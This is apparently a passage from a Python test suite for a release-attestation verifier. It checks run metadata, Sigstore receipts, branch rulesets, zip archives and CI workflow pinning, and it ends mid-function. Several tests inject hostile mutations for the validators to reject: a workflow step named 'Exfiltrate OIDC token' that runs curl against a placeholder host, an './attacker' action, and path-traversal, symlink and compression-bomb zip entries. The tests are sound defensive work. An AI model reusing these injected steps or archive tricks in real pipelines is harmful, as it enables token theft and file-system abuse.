#!/usr/bin/env python3
"""Offline adversarial tests for the FR-0010 epoch-11 trust root."""

from __future__ import annotations

import base64
import copy
import hashlib
import importlib.util
import io
import json
import os
import stat
import subprocess
import tempfile
import unittest
import warnings
import zipfile
from collections import Counter
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from types import ModuleType
from typing import Iterator


ROOT = Path(__file__).resolve().parents[2]
COMMIT = "a" * 40
TREE = "b" * 40
RUN_ID = 42_424_242
RUN_NUMBER = 707
ATTEMPT = 2


def load_module(relative: str, name: str) -> ModuleType:
    specification = importlib.util.spec_from_file_location(name, ROOT / relative)
    if specification is None or specification.loader is None:
        raise RuntimeError(relative)
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    return module


PROTOCOL = load_module(
    "tools/release/framework_recovery_fr_0010.py",
    "_haldir_fr0010_test_protocol",
)
RESULT = load_module(
    "tools/release/framework_recovery_fr_0010_result.py",
    "_haldir_fr0010_test_result",
)
BRIDGE = load_module(
    "tools/release/verify-framework-recovery-fr-0010.py",
    "_haldir_fr0010_test_bridge",
)
CAPTURE = load_module(
    "tools/release/framework_recovery_fr_0010_capture.py",
    "_haldir_fr0010_test_capture",
)
PINS = load_module("tools/verify-ci-pins.py", "_haldir_fr0010_test_pins")


def utc(hour: int, minute: int, second: int = 0) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}Z"


def job(name: str, database_id: int, start: int, end: int) -> dict:
    return {
        "completedAt": utc(12, end),
        "conclusion": "success",
        "databaseId": database_id,
        "name": name,
        "startedAt": utc(12, start),
        "status": "completed",
        "steps": [
            {
                "completedAt": utc(12, end),
                "conclusion": "success",
                "name": "complete",
                "number": 1,
                "startedAt": utc(12, start),
                "status": "completed",
            }
        ],
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/job/{database_id}"
        ),
    }


def run_documents(workflow: str = "ci") -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH11_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH11_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    jobs = []
    for index, name in enumerate(names, start=1):
        start, end = (1, 4) if name == producer else (1, 3)
        if name == attester:
            start, end = 6, 8
        jobs.append(job(name, 50_000 + index, start, end))
    common = {
        "attempt": ATTEMPT,
        "conclusion": "success",
        "createdAt": utc(10, 0),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": utc(12, 10),
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": utc(12, 0),
        "startedAt": utc(12, 0),
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{ATTEMPT}"
        ),
    }
    return ordinary, attempt


def file_record(path: str, seed: str) -> dict:
    payload = seed.encode()
    framed = b"blob " + str(len(payload)).encode() + b"\0" + payload
    return {
        "path": path,
        "git_mode": "100644",
        "git_object_type": "blob",
        "git_object_id": hashlib.sha1(
            framed, usedforsecurity=False
        ).hexdigest(),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "bytes": len(payload),
    }


def result_payload(workflow: str = "ci", attempt: int = ATTEMPT) -> tuple[bytes, list]:
    contract = PROTOCOL.RESULT_CONTRACT[workflow]
    materials = [
        file_record(path, f"material-{index}")
        for index, path in enumerate(contract["material_paths"])
    ]
    value = {
        "schema_version": "1.0.0",
        "protocol": PROTOCOL.RESULT_PROTOCOL,
        "repository": {
            "name": PROTOCOL.REPOSITORY,
            "database_id": PROTOCOL.REPOSITORY_ID,
            "owner_database_id": PROTOCOL.REPOSITORY_OWNER_ID,
        },
        "subject": {
            "commit": COMMIT,
            "tree": TREE,
            "ref": "refs/heads/main",
            "event": "push",
        },
        "execution": {
            "workflow": workflow,
            "workflow_ref": (
                f"sepahead/haldir/{contract['workflow_path']}@refs/heads/main"
            ),
            "job": contract["job"],
            "run_id": RUN_ID,
            "run_attempt": attempt,
            "run_number": RUN_NUMBER,
            "command": contract["command"],
            "result": "PASS",
        },
        "materials": materials,
        "authority": {
            "provenance_only": True,
            "release_authority": False,
            "deployment_authority": False,
            "publication_authority": False,
            "tag_authority": False,
        },
    }
    return PROTOCOL.canonical_json_bytes(value, pretty=True), materials


def artifact(payload: bytes, workflow: str = "ci", attempt: int = ATTEMPT) -> dict:
    artifact_id = 9_001
    return {
        "archive_download_url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}/zip"
        ),
        "created_at": utc(12, 2),
        "digest": "sha256:" + hashlib.sha256(payload).hexdigest(),
        "expired": False,
        "expires_at": "2026-10-27T12:02:00Z",
        "id": artifact_id,
        "name": f"epoch-11-{workflow}-result-attempt-{attempt}.json",
        "node_id": "MDg6QXJ0aWZhY3Q5MDAx",
        "size_in_bytes": len(payload),
        "updated_at": utc(12, 3),
        "url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}"
        ),
        "workflow_run": {
            "head_branch": "main",
            "head_repository_id": PROTOCOL.REPOSITORY_ID,
            "head_sha": COMMIT,
            "id": RUN_ID,
            "repository_id": PROTOCOL.REPOSITORY_ID,
        },
    }


def attestation_fixture(
    payload: bytes,
    workflow: str = "ci",
    attempt: int = ATTEMPT,
) -> tuple[bytes, list]:
    statement = PROTOCOL._expected_attestation_statement(
        workflow=workflow,
        result_digest=hashlib.sha256(payload).hexdigest(),
        subject_commit=COMMIT,
        expected_ref="refs/heads/main",
        run_id=RUN_ID,
        attempt=attempt,
    )
    bundle = {
        "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
        "verificationMaterial": {"tlogEntries": [{"logIndex": "1"}]},
        "dsseEnvelope": {
            "payload": base64.b64encode(
                json.dumps(statement, separators=(",", ":")).encode()
            ).decode(),
            "payloadType": "application/vnd.in-toto+json",
            "signatures": [{"sig": "AA=="}],
        },
    }
    bundle_payload = (
        json.dumps(bundle, separators=(",", ":"), sort_keys=True) + "\n"
    ).encode()
    workflow_path = PROTOCOL.RESULT_CONTRACT[workflow]["workflow_path"]
    identity = (
        f"https://github.com/sepahead/haldir/{workflow_path}@refs/heads/main"
    )
    certificate = {
        "subjectAlternativeName": identity,
        "issuer": "https://token.actions.githubusercontent.com",
        "githubWorkflowTrigger": "push",
        "githubWorkflowSHA": COMMIT,
        "githubWorkflowName": workflow,
        "githubWorkflowRepository": "sepahead/haldir",
        "githubWorkflowRef": "refs/heads/main",
        "buildSignerURI": identity,
        "buildSignerDigest": COMMIT,
        "runnerEnvironment": "github-hosted",
        "sourceRepositoryURI": "https://github.com/sepahead/haldir",
        "sourceRepositoryDigest": COMMIT,
        "sourceRepositoryRef": "refs/heads/main",
        "sourceRepositoryIdentifier": str(PROTOCOL.REPOSITORY_ID),
        "sourceRepositoryOwnerURI": "https://github.com/sepahead",
        "sourceRepositoryOwnerIdentifier": str(
            PROTOCOL.REPOSITORY_OWNER_ID
        ),
        "buildConfigURI": identity,
        "buildConfigDigest": COMMIT,
        "buildTrigger": "push",
        "runInvocationURI": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt}"
        ),
        "sourceRepositoryVisibilityAtSigning": "public",
    }
    receipt = [
        {
            "attestation": {
                "bundle": bundle,
                "bundle_url": "",
                "initiator": "",
            },
            "verificationResult": {
                "mediaType": (
                    "application/vnd.dev.sigstore.verificationresult+json;"
                    "version=0.1"
                ),
                "statement": statement,
                "signature": {"certificate": certificate},
                "verifiedTimestamps": [
                    {
                        "type": "Tlog",
                        "uri": "rekor.sigstore.dev",
                        "timestamp": utc(12, 7),
                    }
                ],
            },
        }
    ]
    return bundle_payload, receipt


def zip_bytes(entries: list[tuple[str, bytes, int | None]]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, payload, mode in entries:
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            if mode is not None:
                info.create_system = 3
                info.external_attr = mode << 16
            archive.writestr(info, payload)
    return output.getvalue()


@contextmanager
def changed_directory(path: Path) -> Iterator[None]:
    previous = Path.cwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(previous)


class RunDocumentTests(unittest.TestCase):
    def test_attempt_two_is_valid_and_fully_bound(self) -> None:
        ordinary, attempt = run_documents()
        result = PROTOCOL.validate_epoch11_run_documents(
            ordinary,
            attempt,
            workflow="ci",
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
        )
        self.assertEqual(result["attempt"], 2)
        self.assertEqual(result["run_id"], RUN_ID)
        self.assertEqual(set(result["jobs"]), PROTOCOL.EPOCH11_CI_JOB_NAMES)

    def test_cross_run_job_url_is_rejected(self) -> None:
        ordinary, attempt = run_documents()
        attempt["jobs"][0]["url"] = (
            "https://github.com/sepahead/haldir/actions/runs/999/job/50001"
        )
        ordinary["jobs"] = copy.deepcopy(attempt["jobs"])
        with self.assertRaisesRegex(ValueError, "FR0010_JOB"):
            PROTOCOL.validate_epoch11_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_cross_attempt_documents_are_rejected(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        with self.assertRaisesRegex(ValueError, "EPOCH11_RUN_METADATA"):
            PROTOCOL.validate_epoch11_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_attempt_bound_is_fail_closed(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = attempt["attempt"] = 9
        with self.assertRaisesRegex(ValueError, "epoch11.attempt_number"):
            PROTOCOL.validate_epoch11_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )


class ResultAndArtifactTests(unittest.TestCase):
    def test_attempt_two_result_and_artifact(self) -> None:
        payload, materials = result_payload()
        PROTOCOL.validate_result_artifact(
            payload,
            workflow="ci",
            subject_commit=COMMIT,
            subject_tree=TREE,
            run_id=RUN_ID,
            attempt=ATTEMPT,
            run_number=RUN_NUMBER,
            expected_ref="refs/heads/main",
            expected_materials=materials,
        )
        PROTOCOL.validate_artifact_metadata(
            artifact(payload),
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            subject_commit=COMMIT,
            result_payload=payload,
            producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
            producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
            attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
        )

    def test_cross_attempt_result_is_rejected(self) -> None:
        payload, materials = result_payload(attempt=1)
        with self.assertRaisesRegex(ValueError, "RESULT_EXECUTION"):
            PROTOCOL.validate_result_artifact(
                payload,
                workflow="ci",
                subject_commit=COMMIT,
                subject_tree=TREE,
                run_id=RUN_ID,
                attempt=2,
                run_number=RUN_NUMBER,
                expected_ref="refs/heads/main",
                expected_materials=materials,
            )

    def test_cross_attempt_artifact_name_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=2,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(
                    2026, 7, 29, 12, 1, tzinfo=timezone.utc
                ),
                producer_completed=datetime(
                    2026, 7, 29, 12, 4, tzinfo=timezone.utc
                ),
                attestation_started=datetime(
                    2026, 7, 29, 12, 6, tzinfo=timezone.utc
                ),
            )

    def test_artifact_outside_producer_window_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["updated_at"] = utc(12, 7)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=ATTEMPT,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(
                    2026, 7, 29, 12, 1, tzinfo=timezone.utc
                ),
                producer_completed=datetime(
                    2026, 7, 29, 12, 4, tzinfo=timezone.utc
                ),
                attestation_started=datetime(
                    2026, 7, 29, 12, 6, tzinfo=timezone.utc
                ),
            )


class AttestationTests(unittest.TestCase):
    def validate(self, bundle: bytes, receipt: list) -> dict:
        payload, _materials = result_payload()
        return PROTOCOL.validate_attestation_evidence(
            bundle,
            receipt,
            workflow="ci",
            result_payload=payload,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            attestation_started=datetime(
                2026, 7, 29, 12, 6, tzinfo=timezone.utc
            ),
            attestation_completed=datetime(
                2026, 7, 29, 12, 8, tzinfo=timezone.utc
            ),
        )

    def test_public_good_tlog_receipt_is_valid(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        result = self.validate(bundle, receipt)
        self.assertEqual(result["transparency_log"]["type"], "Tlog")

    def test_transparency_log_type_mutation_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0][
            "type"
        ] = "TransparencyLog"
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_unpinned_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0][
            "uri"
        ] = "attacker.invalid"
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_capability_url_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["attestation"]["bundle_url"] = "https://example.invalid/token"
        with self.assertRaisesRegex(ValueError, "RECEIPT_BUNDLE"):
            self.validate(bundle, receipt)

    def test_cross_attempt_statement_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "STATEMENT_MISMATCH"):
            self.validate(bundle, receipt)

    def test_witness_outside_attestation_job_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0][
            "timestamp"
        ] = utc(12, 9)
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG_TIME"):
            self.validate(bundle, receipt)


class TrustedRootAndCommandTests(unittest.TestCase):
    def test_real_openssh_detached_signature_is_accepted(self) -> None:
        payload = b"FR-0010 detached signature parser integration\n"
        namespace = "haldir-fr0010-openssh-integration"
        principal = "fixture@example.invalid"
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            private_key = repo / "signing-key"
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-q",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-C",
                    principal,
                    "-f",
                    str(private_key),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            public_key = private_key.with_suffix(".pub")
            fingerprint = (
                subprocess.check_output(
                    ["/usr/bin/ssh-keygen", "-lf", str(public_key)]
                )
                .decode("ascii")
                .split()[1]
            )
            allowed_signers = repo / BRIDGE.ALLOWED_SIGNERS_PATH
            allowed_signers.parent.mkdir(parents=True)
            allowed_signers.write_text(
                f'{principal} namespaces="{namespace}" '
                f"{public_key.read_text(encoding='ascii')}",
                encoding="ascii",
            )
            payload_path = repo / "payload"
            payload_path.write_bytes(payload)
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-Y",
                    "sign",
                    "-f",
                    str(private_key),
                    "-n",
                    namespace,
                    str(payload_path),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            signature = Path(f"{payload_path}.sig").read_text(
                encoding="ascii"
            )
            record = {
                "format": "ssh",
                "namespace": namespace,
                "principal": principal,
                "key_fingerprint": fingerprint,
                "signature": signature,
            }
            original_principal = BRIDGE.SIGNER_PRINCIPAL
            original_fingerprint = BRIDGE.SIGNER_FINGERPRINT
            try:
                BRIDGE.SIGNER_PRINCIPAL = principal
                BRIDGE.SIGNER_FINGERPRINT = fingerprint
                BRIDGE._verify_detached(
                    repo, record, payload, namespace=namespace
                )
            finally:
                BRIDGE.SIGNER_PRINCIPAL = original_principal
                BRIDGE.SIGNER_FINGERPRINT = original_fingerprint

    def test_source_authority_file_is_frozen(self) -> None:
        self.assertIn(BRIDGE.ALLOWED_SIGNERS_PATH, BRIDGE.LEGACY_RECORDS)
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.PROTECTED_AFTER_ACTIVATION,
        )

    def test_commit_verification_ignores_configured_ssh_program(self) -> None:
        command = BRIDGE._verify_commit_argv(Path("/repo"), COMMIT)
        self.assertIn("gpg.ssh.program=/usr/bin/ssh-keygen", command)
        self.assertIn(
            "gpg.ssh.allowedSignersFile=/repo/release/0.9.0/allowed-signers",
            command,
        )

    def test_exact_public_good_root(self) -> None:
        payload = (ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes()
        BRIDGE._validate_trusted_root(payload)
        self.assertEqual(hashlib.sha256(payload).hexdigest(), BRIDGE.TRUSTED_ROOT_SHA256)

    def test_root_byte_substitution_is_rejected(self) -> None:
        payload = bytearray((ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes())
        payload[100] ^= 1
        with self.assertRaisesRegex(RuntimeError, "TRUSTED_ROOT_BOUND"):
            BRIDGE._validate_trusted_root(bytes(payload))

    def test_offline_verification_argv_is_exact(self) -> None:
        command = BRIDGE._verification_argv(
            executable=Path("/usr/bin/gh"),
            result_path=Path("/tmp/result"),
            bundle_path=Path("/tmp/bundle"),
            trusted_root_path=Path("/tmp/root"),
            workflow="ci",
            subject_commit=COMMIT,
        )
        for flag in (
            "--bundle",
            "--custom-trusted-root",
            "--cert-identity",
            "--cert-oidc-issuer",
            "--deny-self-hosted-runners",
            "--predicate-type",
            "--signer-digest",
            "--source-digest",
            "--source-ref",
        ):
            self.assertEqual(command.count(flag), 1)
        self.assertNotIn("--no-public-good", command)
        self.assertNotIn("--signer-workflow", command)
        self.assertIn(COMMIT, command)

    def test_offline_verification_environment_is_deterministic(self) -> None:
        environment = BRIDGE._offline_verification_environment(
            executable=Path("/opt/gh/bin/gh"),
            root=Path("/tmp/root"),
            config_dir=Path("/tmp/root/config"),
        )
        self.assertEqual(environment["TZ"], "UTC")
        self.assertEqual(environment["LC_ALL"], "C")
        self.assertEqual(environment["PATH"], "/opt/gh/bin:/usr/bin:/bin")
        self.assertEqual(environment["NO_PROXY"], "")
        self.assertEqual(
            {
                environment["ALL_PROXY"],
                environment["HTTPS_PROXY"],
                environment["HTTP_PROXY"],
            },
            {"http://127.0.0.1:1"},
        )
        self.assertNotIn("LANG", environment)

    def test_hosted_commands_use_exact_artifact_id(self) -> None:
        commands = BRIDGE._hosted_commands(
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            artifact_id=9001,
        )
        self.assertIn("/artifacts/9001/zip", commands["artifact_download"])
        self.assertIn("/artifacts/9001", commands["artifact_get"])
        self.assertNotIn("gh run download", commands["artifact_download"])
        self.assertIn("attempt-2.json", commands["artifact_list"])


class RulesetTests(unittest.TestCase):
    def fixture(self) -> tuple[list, dict, list]:
        ruleset_id = 8181
        summary = {
            "id": ruleset_id,
            "name": BRIDGE.MAIN_RULESET_NAME,
            "target": "branch",
            "enforcement": "active",
            "source_type": "Repository",
            "source": "sepahead/haldir",
        }
        detail = {
            **summary,
            "bypass_actors": [
                {
                    "actor_id": BRIDGE.MAIN_RULESET_OWNER_ID,
                    "actor_type": "User",
                    "bypass_mode": "always",
                }
            ],
            "conditions": {
                "ref_name": {
                    "exclude": [],
                    "include": ["refs/heads/main"],
                }
            },
            "rules": [
                {
                    "type": "update",
                    "parameters": {
                        "update_allows_fetch_and_merge": False
                    },
                }
            ],
        }
        effective = [
            {
                "type": "update",
                "parameters": {"update_allows_fetch_and_merge": False},
                "ruleset_id": ruleset_id,
                "ruleset_source_type": "Repository",
                "ruleset_source": "sepahead/haldir",
            }
        ]
        return [summary], detail, effective

    def test_owner_only_main_ruleset(self) -> None:
        result = BRIDGE.validate_main_writer_ruleset(*self.fixture())
        self.assertEqual(result["owner_user_id"], 10_104_569)
        self.assertIn("GITHUB_APPS", result["protects_against"])

    def test_additional_bypass_actor_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["bypass_actors"].append(
            {"actor_id": 99, "actor_type": "User", "bypass_mode": "always"}
        )
        with self.assertRaisesRegex(RuntimeError, "RULESET_BYPASS"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)

    def test_fetch_and_merge_update_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["rules"][0]["parameters"][
            "update_allows_fetch_and_merge"
        ] = True
        with self.assertRaisesRegex(RuntimeError, "RULESET_RULES"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)

    def test_non_main_condition_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["conditions"]["ref_name"]["include"] = ["~ALL"]
        with self.assertRaisesRegex(RuntimeError, "RULESET_CONDITIONS"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)


class ArchiveTests(unittest.TestCase):
    def test_minimal_archive_is_bounded(self) -> None:
        payload = zip_bytes(
            [
                ("0_a.txt", b"2026-07-29T12:00:00Z ok\n", stat.S_IFREG | 0o644),
                ("a/system.txt", b"runner\n", stat.S_IFREG | 0o644),
            ]
        )
        result = PROTOCOL.inspect_whole_job_archive(
            payload, expected_jobs=frozenset({"a"})
        )
        self.assertEqual(set(result["jobs"]), {"a"})

    def test_traversal_is_rejected(self) -> None:
        payload = zip_bytes(
            [
                ("0_a.txt", b"x", stat.S_IFREG | 0o644),
                ("a/system.txt", b"x", stat.S_IFREG | 0o644),
                ("../escape", b"x", stat.S_IFREG | 0o644),
            ]
        )
        with self.assertRaisesRegex(ValueError, "ARCHIVE_NAME"):
            PROTOCOL.inspect_whole_job_archive(
                payload, expected_jobs=frozenset({"a"})
            )

    def test_symlink_is_rejected(self) -> None:
        payload = zip_bytes(
            [
                ("0_a.txt", b"x", stat.S_IFLNK | 0o777),
                ("a/system.txt", b"x", stat.S_IFREG | 0o644),
            ]
        )
        with self.assertRaisesRegex(ValueError, "ENTRY_TYPE"):
            PROTOCOL.inspect_whole_job_archive(
                payload, expected_jobs=frozenset({"a"})
            )

    def test_duplicate_is_rejected(self) -> None:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", UserWarning)
            payload = zip_bytes(
                [
                    ("0_a.txt", b"x", stat.S_IFREG | 0o644),
                    ("0_a.txt", b"y", stat.S_IFREG | 0o644),
                    ("a/system.txt", b"x", stat.S_IFREG | 0o644),
                ]
            )
        with self.assertRaisesRegex(ValueError, "ARCHIVE_SHAPE"):
            PROTOCOL.inspect_whole_job_archive(
                payload, expected_jobs=frozenset({"a"})
            )

    def test_compression_bomb_ratio_is_rejected(self) -> None:
        payload = zip_bytes(
            [
                ("0_a.txt", b"\0" * (2 * 1024 * 1024), stat.S_IFREG | 0o644),
                ("a/system.txt", b"x", stat.S_IFREG | 0o644),
            ]
        )
        with self.assertRaisesRegex(ValueError, "ARCHIVE_ENTRY"):
            PROTOCOL.inspect_whole_job_archive(
                payload, expected_jobs=frozenset({"a"})
            )


class WorkflowAndPinTests(unittest.TestCase):
    def test_all_uses_syntax_is_accounted(self) -> None:
        uses, problems = PINS.collect_uses(
            'steps:\n  - uses: owner/action@' + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertEqual(len(uses), 1)
        self.assertEqual(problems, [])

    def test_quoted_uses_key_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            '"uses": owner/action@' + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertTrue(problems)

    def test_mutable_container_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            "uses: docker://alpine:latest\n", label="fixture"
        )
        self.assertTrue(problems)

    def test_oidc_jobs_have_no_repository_execution(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        formal = (ROOT / ".github/workflows/formal.yml").read_text()
        self.assertEqual(
            PINS.verify_oidc_job(
                ci,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            ),
            [],
        )
        self.assertEqual(
            PINS.verify_oidc_job(
                formal,
                label="formal",
                job="attest-formal-audit-result",
                expected_needs=("tlc-model-check",),
            ),
            [],
        )

    def test_oidc_local_action_mutation_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        mutated = ci.replace(
            "      - name: Download immutable audit result",
            "      - uses: ./attacker\n"
            "      - name: Download immutable audit result",
        )
        problems = PINS.verify_oidc_job(
            mutated,
            label="ci",
            job="attest-ci-audit-result",
            expected_needs=(
                "build-test",
                "clean-build",
                "feature-matrix",
                "interop",
                "macos-compile",
                "supply-chain",
            ),
        )
        self.assertTrue(problems)

    def test_oidc_commented_condition_and_always_are_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        condition = (
            "    if: >-\n"
            "      github.repository == 'sepahead/haldir' &&\n"
            "      github.event_name == 'push' &&\n"
            "      github.ref == 'refs/heads/main'\n"
        )
        replacement = (
            "    # if: >-\n"
            "    #   github.repository == 'sepahead/haldir' &&\n"
            "    #   github.event_name == 'push' &&\n"
            "    #   github.ref == 'refs/heads/main'\n"
            "    if: always()\n"
        )
        mutated = ci.replace(condition, replacement, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_oidc_injected_shell_step_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        marker = "      - name: Download immutable audit result\n"
        injected = (
            "      - name: Exfiltrate OIDC token\n"
            "        run: curl https://example.invalid\n"
            + marker
        )
        mutated = ci.replace(marker, injected, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_attempt_qualified_unarchived_outputs(self) -> None:
        for workflow in ("ci", "formal"):
            text = (ROOT / f".github/workflows/{workflow}.yml").read_text()
            self.assertIn("archive: false", text)
            self.assertIn(
                f"epoch-11-{workflow}-result-attempt-${{{{ github.run_attempt }}}}.json",
                text,
            )
            self.assertNotIn(
                f"name: epoch-11-{workflow}-result-attempt", text
            )

    def test_github_cli_archive_is_immutable(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        self.assertEqual(BRIDGE.GH_CLI_VERSION, "2.95.0")
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_BYTES), ci)
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_BYTES), ci)
        self.assertIn(
            "releases/download/v${GH_CLI_VERSION}/"
            "gh_${GH_CLI_VERSION}_linux_amd64.tar.gz",
            ci,
        )
        self.assertIn("--proto '=https'", ci)
        self.assertIn("--proto-redir '=https'", ci)
        self.assertIn("--tlsv1.2", ci)
        self.assertIn(
            '-- "gh_${GH_CLI_VERSION}_linux_amd64/bin/gh"',
            ci,
        )
        self.assertIn("sha256sum --check --strict", ci)
        self.assertNotIn("curl |", ci)

    def test_hosted_runner_labels_are_versioned(self) -> None:
        for workflow, expected in PINS.EXPECTED_RUNNERS.items():
            text = (ROOT / ".github/workflows" / workflow).read_text()
            self.assertEqual(
                Counter(PINS.RUNS_ON_LINE.findall(text)),
                expected,
            )
            self.assertFalse(
                any(
                    label.endswith("-latest")
                    for label in PINS.RUNS_ON_LINE.findall(text)
                )
            )

    def test_gate_does_not_execute_legacy_verifier(self) -> None:
        text = (ROOT / BRIDGE.GATE_PATH).read_text()
        self.assertNotIn("verify-current-audit.py", text)
        self.assertIn("verify-framework-recovery-fr-0010.py", text)


class ResultEmitterTests(unittest.TestCase):
    def make_repo(self, root: Path) -> tuple[Path, str]:
        subprocess.run(["/usr/bin/git", "init", "-q", root], check=True)
        for contract in RESULT.WORKFLOW_CONTRACT.values():
            for relative in contract["materials"]:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(relative + "\n")
        subprocess.run(
            ["/usr/bin/git", "-C", root, "add", "."],
            check=True,
        )
        environment = {
            **os.environ,
